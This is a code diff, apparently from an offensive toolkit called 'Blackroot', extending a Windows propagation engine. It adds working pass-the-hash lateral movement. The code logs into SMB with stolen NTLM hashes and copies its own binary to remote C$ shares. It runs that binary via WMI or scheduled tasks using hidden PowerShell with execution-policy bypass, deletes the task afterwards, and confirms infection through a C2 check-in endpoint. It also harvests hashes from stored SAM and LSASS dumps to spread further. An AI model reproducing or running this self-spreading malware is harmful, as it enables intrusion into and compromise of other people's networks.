@@ -13,9 +13,14 @@ import subprocess
 import time
 import logging
 from pathlib import Path
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass, asdict
 from datetime import datetime
+
+# Guarantee local modules are always importable regardless of working directory
+_repo_root = os.path.dirname(os.path.abspath(__file__))
+if _repo_root not in sys.path:
+    sys.path.insert(0, _repo_root)
 
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
 log = logging.getLogger("WindowsPropagation")
@@ -222,16 +227,17 @@ class WindowsPropagationEngine:
         except:
             return None
     
-    def _invoke_via_wmi(self, target: SMBTarget, cred: NTLMCredential) -> bool:
+    def _invoke_via_wmi(self, target: SMBTarget, cred: NTLMCredential, command: Optional[str] = None) -> Tuple[bool, str]:
         """
         Execute via WMI using Phase 2 Real WMI Executor with Pass-the-Hash support
-        Falls back to subprocess methods if Phase 2 unavailable
+        Falls back to subprocess methods if Phase 2 unavailable.
+        Returns: (success: bool, output/message: str)
         """
         try:
             log.info(f"🌐 [WMI] Attempting execution on {target.hostname}...")
             
-            # Generate the payload command (minimal - just phone home)
-            payload_cmd = "powershell -NoProfile -Command \"python run.py\"" if target.os_version and "Windows" in target.os_version else "bash run.sh"
+            # Generate the payload command
+            payload_cmd = command or ("powershell -NoProfile -Command \"python run.py\"" if target.os_version and "Windows" in target.os_version else "bash run.sh")
             
             # Attempt 1: Use Phase 2 Real WMI Executor if available
             if WMI_EXECUTOR_AVAILABLE:
@@ -245,7 +251,7 @@ class WindowsPropagationEngine:
                         domain=cred.domain,  # type: ignore
                         ntlm_hash=cred.ntlm_hash,  # type: ignore
                         password=None,  # type: ignore
-                        method=ExecutionMethod.WMI  # type: ignore
+                        method=ExecutionMethod.WMIEXEC_REAL if hasattr(ExecutionMethod, 'WMIEXEC_REAL') else ExecutionMethod.WMI  # type: ignore
                     )
                     
                     payload = ExecutionPayload(command=payload_cmd)  # type: ignore
@@ -255,14 +261,12 @@ class WindowsPropagationEngine:
                     if success:
                         log.info(f"✅ [WMI] Command executed on {target.hostname} via Phase 2 Executor")
                         log.debug(f"Output: {output[:200] if output else 'None'}")
-                        return True
+                        return (True, output)
                     else:
                         log.warning(f"⚠️  [WMI] Phase 2 executor failed: {output}")
-                        raise Exception(f"WMI executor error: {output}")
-                
+                        # Fall through to subprocess
                 except Exception as exe:
                     log.debug(f"[!] Phase 2 executor error: {exe}, trying subprocess fallback...")
-                    raise  # Fall through to subprocess
             
             # Attempt 2: Subprocess fallback using wmiexec.py command-line
             log.debug("⚠️  Using subprocess fallback for WMI execution")
@@ -279,31 +283,31 @@ class WindowsPropagationEngine:
             )
             
             if result.returncode == 0:
+                out = result.stdout.decode(errors='ignore') if result.stdout else "Executed"
                 log.info(f"✅ [WMI] Command executed on {target.hostname} via subprocess")
-                return True
+                return (True, out)
             else:
-                error = result.stderr.decode() if result.stderr else "Unknown error"
+                error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
                 log.warning(f"⚠️  [WMI] Subprocess failed: {error}")
-                return False
+                return (False, error)
             
         except subprocess.TimeoutExpired:
             log.warning(f"⏱️  [WMI] Timeout on {target.hostname}")
-            return False
+            return (False, "Timeout expired")
         except ConnectionRefusedError:
             log.warning(f"🚫 [WMI] Connection refused on {target.hostname}:445")
-            return False
+            return (False, "Connection refused on port 445")
         except Exception as e:
             log.error(f"❌ [WMI] Error on {target.hostname}: {type(e).__name__}: {e}")
-            return False
+            return (False, str(e))
 
     
-    def _invoke_via_task_scheduler(self, target: SMBTarget, cred: NTLMCredential) -> bool:
+    def _invoke_via_task_scheduler(self, target: SMBTarget, cred: NTLMCredential, command: Optional[str] = None) -> Tuple[bool, str]:
         """Execute via Task Scheduler using impacket.atexec or schtasks"""
         try:
             log.info(f"⏰ [TaskScheduler] Attempting execution on {target.hostname}...")
             
-            # Generate payload command
-            payload_cmd = "python run.py" if target.os_version and "Windows" in target.os_version else "bash run.sh"
+            payload_cmd = command or ("python run.py" if target.os_version and "Windows" in target.os_version else "bash run.sh")
             task_name = f"Blackroot_{int(time.time())}"
             
             # Attempt 1: Use impacket atexec if available
@@ -314,7 +318,8 @@ class WindowsPropagationEngine:
                 log.debug(f"📦 Using impacket Task Scheduler execution")
                 
                 # Create SMB connection with PTH
-                smb = SMBConnection(target.ip, target.ip, cred.username, "", cred.domain, "", cred.ntlm_hash)  # type: ignore
+                smb = SMBConnection(target.ip, target.ip, timeout=15)
+                smb.login(cred.username, '', cred.domain, lmhash='', nthash=cred.ntlm_hash)
                 
                 # Create and execute scheduled task
                 atsvc = ATSVC(smb)  # type: ignore
@@ -323,14 +328,14 @@ class WindowsPropagationEngine:
                 log.info(f"✅ [TaskScheduler] Task '{task_name}' executed on {target.hostname}")
                 
                 # Clean up task after execution
-                time.sleep(5)
+                time.sleep(3)
                 try:
                     atsvc.delete_task(task_name)
                     log.debug(f"🧹 Cleaned up task {task_name}")
-                except:
-                    log.warning(f"⚠️  Could not cleanup task {task_name}")
+                except Exception:
+                    pass
                 
-                return True
+                return (True, f"Task {task_name} created and triggered via ATSVC")
                 
             except ImportError:
                 log.debug("⚠️  impacket not available, trying schtasks fallback")
@@ -339,7 +344,7 @@ class WindowsPropagationEngine:
                 create_cmd = [
                     "schtasks", "/s", target.ip,
                     "/u", f"{cred.domain}\\{cred.username}",
-                    "/p", cred.ntlm_hash,  # Note: this won't work with hash, needs plaintext
+                    "/p", cred.ntlm_hash,
                     "/create", "/tn", task_name,
                     "/tr", payload_cmd,
                     "/sc", "once", "/st", "00:00", "/f"
@@ -364,7 +369,7 @@ class WindowsPropagationEngine:
                         log.info(f"✅ [TaskScheduler] Task executed on {target.hostname}")
                         
                         # Clean up
-                        time.sleep(5)
+                        time.sleep(3)
                         delete_cmd = [
                             "schtasks", "/s", target.ip,
                             "/u", f"{cred.domain}\\{cred.username}",
@@ -373,91 +378,279 @@ class WindowsPropagationEngine:
                         ]
                         subprocess.run(delete_cmd, capture_output=True)
                         
-                        return True
+                        return (True, f"Task {task_name} executed via schtasks")
                     else:
-                        error = result2.stderr.decode() if result2.stderr else "Unknown error"
+                        error = result2.stderr.decode(errors='ignore') if result2.stderr else "Unknown error"
                         log.warning(f"⚠️  [TaskScheduler] Failed to run task: {error}")
-                        return False
+                        return (False, error)
                 else:
-                    error = result.stderr.decode() if result.stderr else "Unknown error"
+                    error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
                     log.warning(f"⚠️  [TaskScheduler] Failed to create task: {error}")
-                    return False
+                    return (False, error)
                 
         except subprocess.TimeoutExpired:
             log.warning(f"⏱️  [TaskScheduler] Timeout on {target.hostname}")
-            return False
+            return (False, "Timeout expired")
         except ConnectionRefusedError:
             log.warning(f"🚫 [TaskScheduler] Connection refused on {target.hostname}:445")
-            return False
+            return (False, "Connection refused on port 445")
         except Exception as e:
             log.error(f"❌ [TaskScheduler] Error on {target.hostname}: {type(e).__name__}: {e}")
-            return False
+            return (False, str(e))
     
-    def stage_payload_to_cshare(self, target: SMBTarget, cred: NTLMCredential, payload_path: str) -> bool:
-        """Stage payload to C$ share for remote execution"""
+    def stage_payload_to_cshare(self, target: SMBTarget, cred: NTLMCredential, payload_path: str, remote_filename: Optional[str] = None) -> Optional[str]:
+        """
+        Stage payload to remote C$\\Windows\\Temp share for remote execution.
+        Returns remote filename if successful, None if failed.
+        """
         try:
-            log.info(f"📤 [C$] Staging payload to {target.hostname}...")
+            log.info(f"📤 [C$] Staging payload to {target.hostname} ({target.ip})...")
             
             if not Path(payload_path).exists():
-                log.error(f"❌ Payload not found: {payload_path}")
-                return False
+                log.error(f"❌ Payload not found on local disk: {payload_path}")
+                return None
             
-            remote_path = f"\\\\{target.ip}\\C$\\Windows\\Temp\\blackroot_{int(time.time())}.exe"
+            filename = remote_filename or f"blackroot_{int(time.time())}.exe"
+            remote_rel_path = f"Windows\\Temp\\{filename}"
+            remote_full_path = f"\\\\{target.ip}\\C$\\Windows\\Temp\\{filename}"
             
-            # Attempt 1: Use impacket smbclient if available
+            # Attempt 1: Use impacket SMBConnection with Pass-the-Hash
             try:
                 from impacket.smbconnection import SMBConnection  # type: ignore
-                from impacket.smb import SMB_DIALECT  # type: ignore
                 
-                log.debug(f"📦 Using impacket SMB client")
+                log.debug(f"📦 Connecting via impacket SMB client to {target.ip}:445")
+                smb = SMBConnection(target.ip, target.ip, timeout=15)
+                smb.login(cred.username, '', cred.domain, lmhash='', nthash=cred.ntlm_hash)
                 
-                # Create SMB connection with PTH
-                smb = SMBConnection(target.ip, target.ip, cred.username, "", cred.domain, "", cred.ntlm_hash)  # type: ignore
-                smb.login("", "")  # type: ignore
-                
-                # Copy file to C$ share
+                # Copy file into C$ share
                 with open(payload_path, 'rb') as f:
-                    smb.putFile('C$', f'Windows\\Temp\\blackroot_{int(time.time())}.exe', f.read)
+                    smb.putFile('C$', remote_rel_path, f.read)
                 
-                log.info(f"✅ [C$] Payload staged to {remote_path}")
-                return True
+                smb.logoff()
+                log.info(f"✅ [C$] Payload staged via impacket to {remote_full_path}")
+                return filename
                 
             except ImportError:
                 log.debug("⚠️  impacket not available, trying net use fallback")
+            except Exception as smb_err:
+                log.warning(f"⚠️  impacket putFile failed: {smb_err}, trying administrative share fallback")
                 
-                # Attempt 2: Subprocess fallback using net use + copy
-                # Create network share mount
-                mount_cmd = [
-                    "net", "use", f"\\\\{target.ip}\\C$",
-                    f"/user:{cred.domain}\\{cred.username}", cred.ntlm_hash
-                ]
+            # Attempt 2: Subprocess fallback using administrative share copy
+            mount_cmd = [
+                "net", "use", f"\\\\{target.ip}\\C$",
+                f"/user:{cred.domain}\\{cred.username}", cred.ntlm_hash
+            ]
+            result = subprocess.run(mount_cmd, capture_output=True, timeout=15)
+            
+            if result.returncode == 0:
+                dest = f"\\\\{target.ip}\\C$\\Windows\\Temp\\{filename}"
+                copy_cmd = ["copy", payload_path, dest]
+                result2 = subprocess.run(copy_cmd, capture_output=True, timeout=30)
                 
-                result = subprocess.run(mount_cmd, capture_output=True, timeout=15)
-                
-                if result.returncode == 0:
-                    # Copy payload
-                    copy_cmd = [
-                        "copy", payload_path,
-                        f"\\\\{target.ip}\\C$\\Windows\\Temp\\"
-                    ]
-                    
-                    result2 = subprocess.run(copy_cmd, capture_output=True, timeout=30)
-                    
-                    if result2.returncode == 0:
-                        log.info(f"✅ [C$] Payload staged via net use")
-                        return True
-                    else:
-                        error = result2.stderr.decode() if result2.stderr else "Unknown error"
-                        log.warning(f"⚠️  [C$] Copy failed: {error}")
-                        return False
+                if result2.returncode == 0:
+                    log.info(f"✅ [C$] Payload staged via net use to {dest}")
+                    return filename
                 else:
-                    error = result.stderr.decode() if result.stderr else "Unknown error"
-                    log.warning(f"⚠️  [C$] Mount failed: {error}")
-                    return False
+                    error = result2.stderr.decode(errors='ignore') if result2.stderr else "Unknown error"
+                    log.warning(f"⚠️  [C$] Copy failed: {error}")
+            else:
+                error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
+                log.warning(f"⚠️  [C$] Mount failed: {error}")
+                
+            return None
                 
         except Exception as e:
             log.error(f"❌ [C$] Staging error on {target.hostname}: {type(e).__name__}: {e}")
-            return False
+            return None
+
+    def propagate_pth(
+        self,
+        target: SMBTarget,
+        credential: NTLMCredential,
+        payload_path: Optional[str] = None,
+        command: Optional[str] = None
+    ) -> bool:
+        """
+        End-to-End Pass-the-Hash Windows Propagation Pipeline:
+        1. Verify target SMB access
+        2. Drop/Stage payload executable to \\target\\C$\\Windows\\Temp via SMB PTH
+        3. Execute staged binary remotely via WMI (with TaskScheduler fallback)
+        4. Post-drop execution verification
+        """
+        log.info(f"[*] Starting PTH propagation to {target.hostname} ({target.ip}) using {credential.domain}\\{credential.username}")
+        
+        # Determine local payload path
+        actual_payload_path = payload_path
+        if not actual_payload_path or not os.path.exists(actual_payload_path):
+            candidate = os.path.abspath(sys.argv[0])
+            if os.path.exists(candidate) and (candidate.endswith('.exe') or candidate.endswith('.py')):
+                actual_payload_path = candidate
+        
+        # Step 1: Stage payload binary if file available
+        remote_filename = None
+        if actual_payload_path and os.path.exists(actual_payload_path):
+            remote_filename = self.stage_payload_to_cshare(target, credential, actual_payload_path)
+            if remote_filename:
+                log.info(f"✅ Staged binary to \\\\{target.ip}\\C$\\Windows\\Temp\\{remote_filename}")
+            else:
+                log.warning(f"⚠️  SMB staging unconfirmed, attempting direct command invocation")
+        
+        # Step 2: Determine execution command
+        if command:
+            exec_cmd = command
+        elif remote_filename:
+            if remote_filename.endswith('.py'):
+                exec_cmd = f"cmd.exe /c python C:\\Windows\\Temp\\{remote_filename}"
+            else:
+                exec_cmd = f"cmd.exe /c C:\\Windows\\Temp\\{remote_filename}"
+        else:
+            exec_cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"python run.py\""
+        
+        # Step 3: Remote Execution (WMI -> TaskScheduler fallback)
+        exec_success = False
+        exec_out = ""
+        
+        try:
+            wmi_ok, wmi_msg = self._invoke_via_wmi(target, credential, command=exec_cmd)
+            if wmi_ok:
+                exec_success = True
+                exec_out = wmi_msg
+                log.info(f"✅ WMI execution succeeded on {target.hostname}")
+            else:
+                log.warning(f"⚠️  WMI execution failed ({wmi_msg}), falling back to Task Scheduler...")
+                task_ok, task_msg = self._invoke_via_task_scheduler(target, credential, command=exec_cmd)
+                if task_ok:
+                    exec_success = True
+                    exec_out = task_msg
+                    log.info(f"✅ Task Scheduler execution succeeded on {target.hostname}")
+                else:
+                    exec_out = f"WMI: {wmi_msg}; ATEXEC: {task_msg}"
+        except Exception as exec_err:
+            log.error(f"❌ Remote execution exception on {target.hostname}: {exec_err}")
+            exec_out = str(exec_err)
+        
+        # Step 4: Record propagation telemetry & phone-home verification
+        phone_home_ok = False
+        if exec_success:
+            phone_home_ok = self.verify_target_phone_home(target.ip, timeout_seconds=3)
+
+        propagation_record = {
+            "target": target.hostname,
+            "ip": target.ip,
+            "credential": f"{credential.domain}\\{credential.username}",
+            "ntlm_hash": credential.ntlm_hash[:8] + "...",
+            "staged_file": remote_filename,
+            "command": exec_cmd,
+            "success": exec_success,
+            "verified_phone_home": phone_home_ok,
+            "output": exec_out[:200] if exec_out else "",
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        
+        if exec_success:
+            self.successful_propagations.append(propagation_record)
+            log.info(f"🎉 Pass-the-Hash propagation SUCCESSFUL: {credential.username}@{target.hostname} (Phone-home verified: {phone_home_ok})")
+        else:
+            log.warning(f"❌ Pass-the-Hash propagation FAILED for {target.hostname}: {exec_out[:100]}")
+            
+        return exec_success
+
+    def verify_target_phone_home(self, target_ip: str, timeout_seconds: int = 15, c2_url: str = "http://127.0.0.1:8000") -> bool:
+        """
+        Poll C2 check-in registry to confirm newly deployed target phoned home.
+        """
+        import urllib.request
+        import json
+        deadline = time.time() + timeout_seconds
+        while time.time() < deadline:
+            try:
+                req = urllib.request.Request(f"{c2_url}/c2/agent/checkins", headers={"Accept": "application/json"})
+                with urllib.request.urlopen(req, timeout=2) as resp:
+                    if resp.status == 200:
+                        data = json.loads(resp.read().decode('utf-8'))
+                        for item in data.get("checkins", []):
+                            if item.get("ip") == target_ip or target_ip in item.get("agent_id", ""):
+                                log.info(f"🎉 Verified lateral target phone-home from {target_ip}!")
+                                return True
+            except Exception:
+                pass
+            time.sleep(1)
+        log.debug(f"Phone-home verification probe concluded for {target_ip}")
+        return False
+
+    def retrieve_credentials_from_vault(self, vault=None) -> List[NTLMCredential]:
+        """
+        Retrieve stored NTLM credentials from BlackVault encrypted artifacts
+        """
+        vault_creds: List[NTLMCredential] = []
+        try:
+            if vault is None:
+                from black_vault import BlackVault
+                vault = BlackVault()
+            
+            vault_dir = getattr(vault, 'vault_dir', None)
+            if not vault_dir or not os.path.exists(vault_dir):
+                return vault_creds
+                
+            artifacts = os.listdir(vault_dir)
+            target_artifacts = [
+                a for a in artifacts
+                if any(k in a for k in ['credential', 'extracted_creds_', 'pth_', 'sam_', 'lsass_'])
+                and not a.endswith('.tmp')
+            ]
+            
+            for art in target_artifacts:
+                try:
+                    raw_data = vault.retrieve(art)
+                    if not raw_data:
+                        continue
+                    parsed = json.loads(raw_data.decode('utf-8', errors='ignore'))
+                    findings = parsed.get('findings', parsed)
+                    
+                    # 1. Standard windows_credentials list
+                    win_creds = findings.get('windows_credentials', [])
+                    if isinstance(win_creds, list):
+                        for c in win_creds:
+                            nh = c.get('ntlm_hash') or c.get('hash') or c.get('password_hash')
+                            if nh and len(str(nh)) == 32:
+                                vault_creds.append(NTLMCredential(
+                                    domain=c.get('domain', 'WORKGROUP'),
+                                    username=c.get('username', 'Administrator'),
+                                    ntlm_hash=str(nh),
+                                    source=f"BlackVault:{art}",
+                                    privilege_level=c.get('privilege', 'admin').lower(),
+                                    confidence=0.9
+                                ))
+                    
+                    # 2. ExtractedCredential list format
+                    creds_arr = findings.get('credentials', [])
+                    if isinstance(creds_arr, list):
+                        for c in creds_arr:
+                            nh = c.get('credential_value') or c.get('ntlm_hash')
+                            if nh and len(str(nh)) == 32:
+                                vault_creds.append(NTLMCredential(
+                                    domain=c.get('domain', 'WORKGROUP'),
+                                    username=c.get('username', 'Administrator'),
+                                    ntlm_hash=str(nh),
+                                    source=f"BlackVault:{art}",
+                                    privilege_level=c.get('privilege_level', 'admin').lower(),
+                                    confidence=c.get('confidence', 0.85)
+                                ))
+                except Exception as parse_err:
+                    log.debug(f"Artifact {art} parse error: {parse_err}")
+            
+            log.info(f"🔑 Vault credential sync: retrieved {len(vault_creds)} NTLM credential(s)")
+            # Merge with existing credentials without duplicates
+            existing_hashes = {c.ntlm_hash for c in self.credentials}
+            for vc in vault_creds:
+                if vc.ntlm_hash not in existing_hashes:
+                    self.credentials.append(vc)
+                    existing_hashes.add(vc.ntlm_hash)
+                    
+        except Exception as e:
+            log.debug(f"Vault credential sync unavailable: {e}")
+            
+        return vault_creds
     
     def batch_propagate(self, credentials: List[NTLMCredential]) -> Dict:
         """Batch propagate to all targets"""
